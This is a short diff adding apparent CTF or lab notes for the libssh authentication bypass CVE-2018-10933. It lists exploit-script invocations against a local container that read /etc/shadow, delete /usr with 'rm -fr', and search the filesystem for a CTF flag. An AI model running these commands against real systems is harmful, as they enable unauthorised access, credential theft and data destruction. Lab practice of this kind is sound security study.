@@ -1,0 +1,12 @@
+poc cve
+./libsshauthbypass.py --host localhost -p 1337 -c 'cat /etc/shadow'
+./libsshauthbypass.py --host localhost -p 1337 -c 'rm -fr /usr'
+./libsshauthbypass.py --host localhost -p 1337 -c 'ls'
+
+hacked
+./run.sh sspringe_cve_2018_10933:0.1 1337
+./libsshauthbypass.py --host localhost -p 1337 -c 'ls'
+./libsshauthbypass.py --host localhost -p 1337 -c 'find / -type l'
+./libsshauthbypass.py --host localhost -p 1337 -c 'find / -type l -exec stat {} +
+./libsshauthbypass.py --host localhost -p 1337 -c 'find / -type l -exec stat {} + | grep "File:.*CTF.*"'
+ 
